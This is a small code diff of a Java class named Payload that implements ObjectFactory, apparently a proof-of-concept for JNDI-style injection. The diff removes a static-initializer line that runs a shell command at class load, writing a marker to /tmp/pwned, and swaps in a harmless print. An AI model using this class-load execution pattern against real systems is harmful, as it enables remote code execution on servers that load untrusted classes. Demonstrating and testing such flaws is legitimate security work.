@@ -6,7 +6,7 @@ import java.util.Hashtable;
 public class Payload implements ObjectFactory {
     static {
         try {
-            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "echo 'bambino was here' > /tmp/pwned"});
+            System.out.println("bambino was here");
         } catch (Exception e) {
             e.printStackTrace();
         }
